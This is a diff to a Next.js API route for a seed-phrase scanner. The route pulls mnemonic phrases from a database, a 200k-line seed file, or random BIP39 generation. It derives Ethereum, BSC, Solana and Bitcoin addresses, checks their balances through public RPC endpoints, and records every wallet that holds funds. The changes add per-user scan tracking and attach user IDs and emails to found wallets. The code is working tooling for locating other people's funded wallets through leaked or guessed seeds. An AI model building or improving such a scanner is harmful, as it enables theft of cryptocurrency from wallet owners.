@@ -68,11 +68,7 @@ async function checkEthBatch(addresses: string[]): Promise<Record<string, number
           const balances: Record<string, number> = {};
           for (const item of results) {
             const idx = item.id;
-            if (item.result) {
-              balances[addresses[idx]] = parseInt(item.result, 16) / 1e18;
-            } else {
-              balances[addresses[idx]] = 0;
-            }
+            balances[addresses[idx]] = item.result ? parseInt(item.result, 16) / 1e18 : 0;
           }
           return balances;
         }
@@ -107,11 +103,7 @@ async function checkBscBatch(addresses: string[]): Promise<Record<string, number
           const balances: Record<string, number> = {};
           for (const item of results) {
             const idx = item.id;
-            if (item.result) {
-              balances[addresses[idx]] = parseInt(item.result, 16) / 1e18;
-            } else {
-              balances[addresses[idx]] = 0;
-            }
+            balances[addresses[idx]] = item.result ? parseInt(item.result, 16) / 1e18 : 0;
           }
           return balances;
         }
@@ -126,8 +118,7 @@ async function checkSolBatch(addresses: string[]): Promise<Record<string, number
   const rpcs = [
     'https://api.mainnet-beta.solana.com',
     'https://solana-rpc.publicnode.com',
-    'https://rpc.ankr.com/solana',
-    'https://solana.llamarpc.com'
+    'https://rpc.ankr.com/solana'
   ];
   const payload = addresses.map((addr, i) => ({
     jsonrpc: '2.0', id: i, method: 'getBalance', params: [addr]
@@ -147,11 +138,7 @@ async function checkSolBatch(addresses: string[]): Promise<Record<string, number
           const balances: Record<string, number> = {};
           for (const item of results) {
             const idx = item.id;
-            if (item.result && item.result.value !== undefined) {
-              balances[addresses[idx]] = item.result.value / 1e9;
-            } else {
-              balances[addresses[idx]] = 0;
-            }
+            balances[addresses[idx]] = (item.result && item.result.value !== undefined) ? item.result.value / 1e9 : 0;
           }
           return balances;
         }
@@ -173,11 +160,7 @@ async function checkBtcBatch(addresses: string[]): Promise<Record<string, number
       const data = await res.json();
       const balances: Record<string, number> = {};
       for (const addr of addresses) {
-        if (data[addr]) {
-          balances[addr] = (data[addr].final_balance || 0) / 1e8;
-        } else {
-          balances[addr] = 0;
-        }
+        balances[addr] = data[addr] ? (data[addr].final_balance || 0) / 1e8 : 0;
       }
       return balances;
     }
@@ -190,13 +173,17 @@ export async function POST(req: NextRequest) {
     const body = await req.json().catch(() => ({}));
     const batchSize = Math.min(body.batchSize || 10, 25);
     const customPhrases: string[] = body.phrases || [];
+    const userId: string = body.userId || 'public';
+    const userEmail: string = body.userEmail || 'anónimo';
 
     let currentIdx = 0;
     let foundWalletsCount = 0;
     let totalDbPhrases = 0;
 
+    const statId = (userId === 'public') ? 'main' : `stats_${userId}`;
+
     try {
-      const { data: stats } = await supabaseAdmin.from('scan_stats').select('*').eq('id', 'main').single();
+      const { data: stats } = await supabaseAdmin.from('scan_stats').select('*').eq('id', statId).single();
       if (stats) {
         currentIdx = Number(stats.processed || 0);
         foundWalletsCount = Number(stats.found_wallets || 0);
@@ -209,11 +196,12 @@ export async function POST(req: NextRequest) {
     if (customPhrases.length > 0) {
       phrasesToScan = customPhrases.slice(0, batchSize);
     } else {
-      // 1. Intentar cargar semillas desde la base de datos Supabase (mnemonic_seeds)
+      // 1. Intentar cargar semillas del usuario actual desde mnemonic_seeds
       try {
         const { data: dbSeeds, count } = await supabaseAdmin
           .from('mnemonic_seeds')
           .select('phrase', { count: 'exact' })
+          .eq('user_id', userId)
           .range(currentIdx, currentIdx + batchSize - 1);
 
         if (count) totalDbPhrases = count;
@@ -223,7 +211,7 @@ export async function POST(req: NextRequest) {
         }
       } catch {}
 
-      // 2. Si no hay semillas en Supabase, intentar cargar desde seeds_200k.txt local/public
+      // 2. Si no hay semillas personales, buscar en semillas públicas o generador BIP39
       if (phrasesToScan.length === 0) {
         const seedFilePath = path.join(process.cwd(), 'seeds_200k.txt');
         const publicSeedPath = path.join(process.cwd(), 'public', 'seeds_200k.txt');
@@ -235,16 +223,14 @@ export async function POST(req: NextRequest) {
             const lines = fileContent.split('\n').map(l => l.trim()).filter(Boolean);
             if (lines.length > 0) {
               totalDbPhrases = lines.length;
-              if (currentIdx >= lines.length) {
-                currentIdx = 0;
-              }
+              if (currentIdx >= lines.length) currentIdx = 0;
               phrasesToScan = lines.slice(currentIdx, currentIdx + batchSize);
             }
           } catch {}
         }
       }
 
-      // 3. Si tampoco hay archivo, usar el generador aleatorio BIP39
+      // 3. Fallback BIP-39
       if (phrasesToScan.length === 0) {
         for (let i = 0; i < batchSize; i++) {
           phrasesToScan.push(bip39.generateMnemonic());
@@ -268,7 +254,6 @@ export async function POST(req: NextRequest) {
     const solAddrs = validItems.map(v => v.sol);
     const btcAddrs = validItems.map(v => v.btc);
 
-    // Consultar saldos en paralelo
     const [ethBals, bscBals, solBals, btcBals] = await Promise.all([
       checkEthBatch(ethAddrs),
       checkBscBatch(ethAddrs),
@@ -296,9 +281,14 @@ export async function POST(req: NextRequest) {
 
       if (eth_bal > 0 || bsc_bal > 0 || sol_bal > 0 || btc_bal > 0) {
         foundWalletsCount++;
-        newlyFound.push(detail);
+        const dbRecord = {
+          ...detail,
+          user_id: userId,
+          user_email: userEmail
+        };
+        newlyFound.push(dbRecord);
         try {
-          await supabaseAdmin.from('wallet_results').insert([detail]);
+          await supabaseAdmin.from('wallet_results').insert([dbRecord]);
         } catch {}
       }
     }
@@ -306,7 +296,8 @@ export async function POST(req: NextRequest) {
     const newProcessed = currentIdx + phrasesToScan.length;
     try {
       await supabaseAdmin.from('scan_stats').upsert({
-        id: 'main',
+        id: statId,
+        user_id: userId,
         total_phrases: totalDbPhrases || newProcessed,
         processed: newProcessed,
         found_wallets: foundWalletsCount,
@@ -327,7 +318,6 @@ export async function POST(req: NextRequest) {
 
   } catch (err: unknown) {
     const message = err instanceof Error ? err.message : 'Internal server error';
-    console.error('Scan batch error:', err);
     return NextResponse.json({ error: message }, { status: 500 });
   }
 }
